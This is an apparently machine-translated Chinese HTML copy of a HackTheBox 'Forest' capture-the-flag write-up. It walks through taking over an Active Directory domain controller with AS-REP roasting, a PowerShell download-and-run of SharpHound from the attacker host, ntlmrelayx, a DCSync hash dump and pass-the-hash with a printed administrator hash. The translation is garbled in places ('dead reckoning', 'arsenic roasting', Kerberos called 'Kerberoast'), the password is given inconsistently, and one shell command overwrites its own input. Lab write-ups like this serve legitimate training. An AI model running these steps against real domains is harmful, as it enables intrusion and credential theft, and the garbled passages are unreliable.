<html>
<head>
<title>HacktheBox — Forest</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子——森林</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-forest-5a11553de1?source=collection_archive---------1-----------------------#2020-03-21">https://infosecwriteups.com/hackthebox-forest-5a11553de1?source=collection_archive---------1-----------------------#2020-03-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/f3b089dc7fc0a24341d4ac9ba8e1bb69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*ECzo-YPjLe6z9JkN9vWxEw.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/212" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/212</a></figcaption></figure><h1 id="839b" class="jz ka iq bd kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw bi translated">TL；速度三角形定位法(dead reckoning)</h1><p id="30a9" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">Forest在我最喜欢的机器列表中。它向您展示了不同的工具，并提供了枚举、交互和利用通常与Windows Active Directory相关的服务的实际用法。它首先通过RPC枚举一个用户，并利用Kerberos预授权来获取用户的密码。然后，用户属于一个允许他将用户添加到“Windows Exchange权限”的组，该组被允许执行DCSync攻击以获取管理员哈希。在这个过程中，我会试着用最短和最有效的方式解释一些概念，这些概念是你理解正在发生的事情所必需的。首先，我将向您介绍一下Active Directory，因为这个盒子在某种程度上是Active Directory攻击的重点，所以如果您熟悉AD和DC的概念，这是值得的。</p><h1 id="6001" class="jz ka iq bd kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw bi translated">什么是Active Directory或Active Directory目录服务？</h1><p id="f4b8" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">根据<a class="ae jy" href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview" rel="noopener ugc nofollow" target="_blank"> Windows文档</a>:</p><blockquote class="lv lw lx"><p id="42c4" class="kx ky ly kz b la lz lc ld le ma lg lh mb mc lk ll md me lo lp mf mg ls lt lu ij bi translated">目录是存储网络上对象信息的分层结构。目录服务(如Active Directory域服务(AD DS ))提供了存储目录数据并使这些数据可供网络用户和管理员使用的方法。例如，AD DS <strong class="kz ir">存储关于<strong class="kz ir">用户账户</strong>的信息</strong>，如<strong class="kz ir">姓名、</strong>电话号码等等，而<strong class="kz ir">使同一网络上的其他授权用户</strong>能够访问这些信息。</p></blockquote><p id="1858" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">当AD DS安装在Windows服务器上时，它通常会成为域控制器。<a class="ae jy" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc786438(v=ws.10)?redirectedfrom=MSDN" rel="noopener ugc nofollow" target="_blank">域控制器(DC)是运行某个版本的Windows Server操作系统并安装了活动目录域服务的服务器。</a></p><h1 id="65a1" class="jz ka iq bd kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw bi translated">侦察</h1><p id="39df" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">我首先运行默认的nmap扫描，目标是枚举正在运行的服务及其版本:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="3ef6" class="mq ka iq mm b gy mr ms l mt mu"># nmap -sV -sC -oA nmap/initial 10.10.10.161</span></pre><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi mv"><img src="../Images/818a288308f425d8ae08019913f4b1b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EyQra422OXqJorLYYt_2fQ.png"/></div></div></figure><p id="7e8e" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">初始扫描后，许多端口都是开放的。因为像这样的机器通常模拟一个域控制器，所以我感兴趣的服务是Kerberos、RPC、LDAP和SMB，因为这些服务通常提供关于机器中的用户和组的大量信息。脚本结果还确定了以下内容:</p><ul class=""><li id="7c57" class="na nb iq kz b la lz le ma li nc lm nd lq ne lu nf ng nh ni bi translated">计算机名:森林</li><li id="8474" class="na nb iq kz b la nj le nk li nl lm nm lq nn lu nf ng nh ni bi translated">域名:htb.local</li><li id="f7a6" class="na nb iq kz b la nj le nk li nl lm nm lq nn lu nf ng nh ni bi translated">林名:htb.local</li><li id="4a64" class="na nb iq kz b la nj le nk li nl lm nm lq nn lu nf ng nh ni bi translated">FQDN: FOREST.htb.local</li></ul><p id="cc94" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我还扫描了所有的TCP端口:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="f8b8" class="mq ka iq mm b gy mr ms l mt mu"># nmap -p- -oA nmap/allports-tcp 10.10.10.161</span></pre><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/4054c06274e8a936f84ca64495ea5965.png" data-original-src="https://miro.medium.com/v2/resize:fit:676/format:webp/1*xLD0RFGpv1dXSZOs9QtR8g.png"/></div></figure><p id="bf9f" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">除了初始扫描之外，我感兴趣的服务是wsman(端口5985)。这意味着我可以“像SSH一样”连接到机器并建立会话。我不会列举DNS，因为域控制器通常打开TCP 53，因为它们充当域中计算机的DNS服务器。</p><h2 id="145d" class="mq ka iq bd kb np nq dn kf nr ns dp kj li nt nu kn lm nv nw kr lq nx ny kv nz bi translated">枚举— RPC(端口135)</h2><p id="4d90" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">我使用rpcclient通过空会话连接到服务。</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi oa"><img src="../Images/93d62ac269045a9a7fe51b9b486289cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fFirAURej5BFicXdo40w9w.png"/></div></div></figure><p id="6d8d" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我调用命令<em class="ly"> enumdomusers </em>，它列出了所有的域用户。</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/6697e95fa03bb4fd0c88f0e59cab7566.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/1*QL3Y_T1HR2XiL79-Qy0yLA.png"/></div></figure><p id="72d8" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">有趣的用户是sebastien、lucinda、andy、mark和santi。帐户Administrator、Guest和krbtgt是Windows服务器中的默认帐户。我处理输出并将其保存到一个文件中:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="6df2" class="mq ka iq mm b gy mr ms l mt mu"># cat users.list | cut -d "[" -f 2 | cut -d "]" -f 1 &gt; users.list</span></pre><p id="ea2e" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我还运行了<em class="ly"> enumdomgroups </em>命令，发现了两个有趣的组:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/a10a59a0d9d11910d2b962ca366e1446.png" data-original-src="https://miro.medium.com/v2/resize:fit:914/format:webp/1*gGpF_KTrTQC9IctAXamfMA.png"/></div></figure><h2 id="e7c8" class="mq ka iq bd kb np nq dn kf nr ns dp kj li nt nu kn lm nv nw kr lq nx ny kv nz bi translated">枚举— LDAP(端口389)</h2><p id="e1fc" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">您可以通过LDAP查询域控制器。枚举LDAP的一个好方法是使用LDAP的nmap脚本。</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="eb6e" class="mq ka iq mm b gy mr ms l mt mu"># ls /usr/share/nmap/scripts/| grep ldap</span><span id="b880" class="mq ka iq mm b gy od ms l mt mu"><br/>ldap-brute.nse<br/>ldap-novell-getpass.nse<br/>ldap-rootdse.nse<br/>ldap-search.nse</span></pre><p id="fb92" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">在所有的脚本中，对我最有用的是ldap-search:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="89ca" class="mq ka iq mm b gy mr ms l mt mu"># nmap -p 389 --script ldap-search 10.10.10.161</span></pre><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/b3d9c851bfd6b5a19bf6f5f35dc87cb0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1128/format:webp/1*wnk5hGm9N_XjDbiyCOE5pg.png"/></div></figure><p id="22ea" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">被调用命令的结果说明了该域的很多情况。让我印象深刻的是，很多CN都是关于微软的邮件服务Exchange的。</p><h2 id="52e6" class="mq ka iq bd kb np nq dn kf nr ns dp kj li nt nu kn lm nv nw kr lq nx ny kv nz bi translated">枚举— SMB(端口445)</h2><p id="c11a" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">我检查是否可以使用空会话连接，并可能列出共享或文件。我使用smbmap来实现这一点:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi of"><img src="../Images/7319bf2ae70ff15d45300349726735ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*844xCh8yS-2MDDXUYpzoeg.png"/></div></div></figure><p id="c73a" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我被拒绝了。我尝试了其他基本凭证，但它们不起作用。</p><h1 id="03d5" class="jz ka iq bd kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw bi translated">初始访问—用户</h1><h2 id="dd30" class="mq ka iq bd kb np nq dn kf nr ns dp kj li nt nu kn lm nv nw kr lq nx ny kv nz bi translated">砷焙烧</h2><p id="567e" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">在尝试了很多东西之后，我在探索对Kerberoast(端口88)的攻击时遇到了AS-REP烘烤。几乎所有的攻击都需要域的有效用户名和密码，只有一种技术例外。</p><p id="c3c5" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">代理烘烤是对Kerberos的一种攻击，在这种攻击中，您可以请求由未启用预验证的用户加密的数据。预身份验证发生在Kerberos身份验证期间，是第一步。Kerberoast是Windows除NTLM之外的身份验证机制。域控制器通常是KDC。我建议您研究Kerberos是如何工作的，但这并不是解决这个问题所必需的。</p><p id="1a2d" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">如果启用了预身份验证:</p><ul class=""><li id="d8fa" class="na nb iq kz b la lz le ma li nc lm nd lq ne lu nf ng nh ni bi translated">用户将时间戳(AS-REQ)发送到域控制器，该时间戳由用户的散列加密。</li><li id="49cc" class="na nb iq kz b la nj le nk li nl lm nm lq nn lu nf ng nh ni bi translated">域控制器使用用户的散列对其进行解密(因为DC拥有域中帐户的所有散列的副本),并检查时间戳是否在其时间的5分钟内。为了使Kerberoast身份验证正常工作，请求者和DC的时间差应该在5分钟以内。</li><li id="4b7d" class="na nb iq kz b la nj le nk li nl lm nm lq nn lu nf ng nh ni bi translated">如果是，它将发送一个AS-REP，并继续进行Kerberoast认证的下一步，我将不在本文中讨论，因为它不需要解决这个问题。</li></ul><p id="75fa" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">如果预身份验证被禁用:</p><ul class=""><li id="2a6b" class="na nb iq kz b la lz le ma li nc lm nd lq ne lu nf ng nh ni bi translated">任何人都可以请求任何有效用户的信息，DC会向您发送由用户密码加密的数据(AS-REP ),您可以离线破解。</li><li id="a376" class="na nb iq kz b la nj le nk li nl lm nm lq nn lu nf ng nh ni bi translated">请注意，默认情况下，预身份验证是启用的，但可以由用户帐户修改。</li></ul><p id="d445" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">所以我在这里试图利用的是Kerberos的预认证部分，因此这种攻击被称为AS-REP烘烤(因为攻击的目的是破解AS-REP)。然后，我可以使用<a class="ae jy" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank"> Impacket </a>的GetNPUsers为找到的用户名请求数据，希望某个帐户已经禁用了预授权。我请求:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="8eab" class="mq ka iq mm b gy mr ms l mt mu">/usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile users.list</span></pre><p id="3c81" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">结果显示我能够获得一个AS-REP。这意味着用户svc-alfresco禁用了PREAUTH。</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi og"><img src="../Images/2365dfe6c0e2d53e4ebff9adcad52dce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KXJl_Xl2JB-It9pygUHerg.png"/></div></div></figure><p id="3246" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">注意，每次运行GetNPUsers时，您将获得不同的AS-REP(因为被请求的数据是不同的)，但是相同的密码将被破解。然后我可以使用hashcat破解用户的密码。</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="48e5" class="mq ka iq mm b gy mr ms l mt mu"># hashcat -m 18200 hashfile wordlist</span></pre><p id="737b" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">注意，mode是18200(如果您查找hashcat的示例散列，您会发现这是针对Kerberos 5 AS-REP etype 23类型的。“etype”我认为是加密类型，也就是RC4-HMAC。</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi oh"><img src="../Images/f9f7f1d5c8cba75bea05d2368f1dee33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CSVjxvPxhtbx1JJqGN-CAA.png"/></div></div></figure><p id="e4fa" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">帐户svc-alfresco的密码是“s3r service”。</p><h2 id="de32" class="mq ka iq bd kb np nq dn kf nr ns dp kj li nt nu kn lm nv nw kr lq nx ny kv nz bi translated">获取用户:</h2><p id="c0b5" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">由于端口5985是开放的，我使用<a class="ae jy" href="https://github.com/Hackplayers/evil-winrm" rel="noopener ugc nofollow" target="_blank"> evil-winrm </a>连接到机器。您可以使用Powershell的Enter-PSSession或其他cmdlets来完成此操作。我请求:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="e358" class="mq ka iq mm b gy mr ms l mt mu">evil-winrm -u svc-alfresco -p 's3rvice' -i 10.10.10.161</span></pre><p id="85d1" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">凭证有效。</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi oi"><img src="../Images/fd019a7e2cc80c9e6261bca329a9c297.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LXE7FWEETrPad3fWMMVCwQ.png"/></div></div></figure><p id="a5aa" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">然后，我列出了C:\users目录下的所有文件，并发现我可以访问user.txt:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/c4025680355221dbdec4f49c33e555c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1106/format:webp/1*4jEtIZigj1HvUMCk7VYKQg.png"/></div></figure><h1 id="afde" class="jz ka iq bd kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw bi translated">SVC-户外→管理员</h1><p id="f104" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">然后，我运行<em class="ly"> whoami /all </em>来检查我所属的组:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/26eef43a5cdc71ca0296f7a84d9f7b79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1090/format:webp/1*DF46MlBY74GzwDh7L5spkQ.png"/></div></figure><p id="77fb" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我发现我属于特权IT帐户和服务帐户组(提示是用户名以svc开头)。由于这是一个域控制器，我然后使用<a class="ae jy" href="https://github.com/BloodHoundAD/BloodHound" rel="noopener ugc nofollow" target="_blank"> BloodHound </a>(当我解决这台机器时，Bloodhound 3尚未发布)来自动获取关于域的信息。</p><h2 id="6607" class="mq ka iq bd kb np nq dn kf nr ns dp kj li nt nu kn lm nv nw kr lq nx ny kv nz bi translated">大猎犬</h2><p id="2854" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">Bloodhound是一个GUI工具，它使用neo4j作为其数据库管理。基本上，一个ingestor收集了关于域的大量信息，将它们存储在大量json文件中，由BloodHound为您处理。这篇文章不是关于如何经营猎犬。我首先使用SharpHound收集关于域的信息。</p><p id="6b82" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我设置了一个python http服务器来服务SharpHound.ps1，并在机器的内存上运行它，然后运行Invoke-BloodHound:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="123d" class="mq ka iq mm b gy mr ms l mt mu">PS &gt; iex(new-object net.webclient).downloadString('<a class="ae jy" href="http://10.10.14.4/SharpHound.ps1'" rel="noopener ugc nofollow" target="_blank">http://myvpnip/SharpHound.ps1'</a>); Invoke-BloodHound -Collect<br/>ionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice</span></pre><p id="1185" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">收集的数据将存储在ZIP文件中:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi ol"><img src="../Images/8b1b133b37fcc177b83321ccc5d7fdf9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sR6urogZYxsTSMMIksQcCw.png"/></div></div></figure><p id="1f9a" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">然后，我使用SMB通过impacket中的smbserver脚本将文件传输到我的机器上:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="825e" class="mq ka iq mm b gy mr ms l mt mu">smbserver.py -smb2support -username sifo -password sifo smb smb/</span></pre><p id="6967" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">将它传输到我的本地计算机:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi om"><img src="../Images/9edeaa75ec08c5ec67c5101a7f11306f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cB3gS7whkRZJwYdmAcHfUw.png"/></div></div></figure><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi on"><img src="../Images/0a8865b5dd501d19f2714af66a6d49fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1274/format:webp/1*hJY9m9zmT3ty15DIvWyTvw.png"/></div></figure><p id="8aca" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我只是将ZIP文件拖到BloodHound，并选择查询“查找到域管理员的最短路径”:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi oo"><img src="../Images/f1c41979510e5449300bceba1431638a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s0V_obpns0oOs-_J4_463A.png"/></div></div></figure><p id="b40f" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我可以看到svc-alfresco是服务帐户的成员，这是特权IT帐户的成员。特权IT帐户是帐户操作员的成员。Account Operators拥有对Exchange Windows权限的一般(即完全对象控制，即我可以添加用户)访问权限。Exchange Windows权限具有对域HTB.LOCAL的WriteDACL(这意味着，我可能会授予自己执行DCSync攻击的权限)。在阅读了有关我如何滥用向Exchange Windows权限添加用户的能力的更多信息后，我看到了这篇文章:</p><div class="op oq gp gr or os"><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" rel="noopener  ugc nofollow" target="_blank"><div class="ot ab fo"><div class="ou ab ov cl cj ow"><h2 class="bd ir gy z fp ox fr fs oy fu fw ip bi translated">使用Active Directory中的ACL提升权限</h2><div class="oz l"><h3 class="bd b gy z fp ox fr fs oy fu fw dk translated">由Rindert Kramer和Dirk-jan Mollema在内部渗透测试中研究和编写的介绍，它…</h3></div><div class="pa l"><p class="bd b dl z fp ox fr fs oy fu fw dk translated">blog.fox-it.com</p></div></div><div class="pb l"><div class="pc l pd pe pf pb pg js os"/></div></div></a></div><h2 id="d514" class="mq ka iq bd kb np nq dn kf nr ns dp kj li nt nu kn lm nv nw kr lq nx ny kv nz bi translated">DCSync攻击:</h2><p id="9817" class="pw-post-body-paragraph kx ky iq kz b la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu ij bi translated">域控制器可以在一个域中共存。然后，域控制器通过与域中的其他域控制器同步来执行备份。如果用户可以在域上拥有复制-获取-更改-所有权限，这可能会被滥用。然后，我可以欺骗任何域控制器将其密码哈希数据库“同步”给我。</p><p id="4ef0" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">根据上面提到的文章，如果我们可以修改我们有权访问的用户的ACL以被授予复制权限，则可以执行称为“ACL攻击”的第一种攻击。</p><p id="9d02" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我首先调用Get-ADGroupMember来检查“Exchange Windows权限”组的成员:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi ph"><img src="../Images/7cedc6b73260204e4f75908b4dbc6816.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MFLoGOVw4U4KmnYuD1lnKA.png"/></div></div></figure><p id="87b0" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">为了能够执行DCSync攻击，我首先在“Exchange Windows权限”组中添加一个用户。在这种情况下，我决定只添加svc-alfresco。</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="b743" class="mq ka iq mm b gy mr ms l mt mu">PS &gt; Add-AdGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco</span></pre><p id="bec5" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">再次运行Get-ADGroupMember，我发现svc-alfresco现在是一个成员:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi pi"><img src="../Images/bcf05578c22a0bb68d227ddfaa4f376f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jxd3vH52DOwJrw3HgBE7xQ.png"/></div></div></figure><p id="c54f" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">然后，我将ntlmrelay.py从Impacket设置为中继到LDAP，并将用户svc-alfresco升级为复制特权。</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="52e5" class="mq ka iq mm b gy mr ms l mt mu">ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco</span></pre><p id="a88c" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">由于我可以将用户放入“Exchange Windows Permissions”组，如果我通过访问http://localhost/privexchange(任何目录都可以，这是随机的)并使用svc-alfresco的凭据进行身份验证，那么我就可以升级为域管理员(对域拥有控制权，这意味着我可以访问所有哈希，包括管理员哈希)。</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi pj"><img src="../Images/2ee5afb3bbc2c2a205d4134ae82c1283.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*czmpGtJPCi3KSmIUH9lpTg.png"/></div></div></figure><p id="df8b" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">既然svc-alfresco是域管理员，那么我可以使用Impacket的secretsdump.py来执行DCSync攻击，收集所有用户散列:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="bfbd" class="mq ka iq mm b gy mr ms l mt mu"># secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc -outputfile secrets-dump.txt</span></pre><p id="a1df" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">我得到了哈希值:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi pk"><img src="../Images/10f7d64125cad493535bfff690ed527e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Uxa2aeo4ehLVUzZWvQqXKQ.png"/></div></div></figure><p id="d2c3" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">现在我已经有了管理员散列，我使用evil-winrm与机器建立一个会话:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="1677" class="mq ka iq mm b gy mr ms l mt mu">evil-winrm -u Administrator -i 10.10.10.161 -H '32693b11e6aa90eb43d32c72a07ceea6'</span></pre><p id="2b75" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">列出桌面中的文件，我现在可以读取root.txt。</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi pl"><img src="../Images/6f1ccaee4abf65bb84ef2f67fb3e9151.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*350y1LEO9geAonUoUTsmxg.png"/></div></div></figure><p id="b5c9" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated">这就是我如何从黑客盒子中解决森林问题的！这是一个可怕的旅程，但绝对值得！感谢阅读！🍺</p></div><div class="ab cl pm pn hu po" role="separator"><span class="pp bw bk pq pr ps"/><span class="pp bw bk pq pr ps"/><span class="pp bw bk pq pr"/></div><div class="ij ik il im in"><p id="5dd3" class="pw-post-body-paragraph kx ky iq kz b la lz lc ld le ma lg lh li mc lk ll lm me lo lp lq mg ls lt lu ij bi translated"><em class="ly">关注</em> <a class="ae jy" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ly"> Infosec报道</em> </a> <em class="ly">获取更多此类精彩报道。</em></p><div class="op oq gp 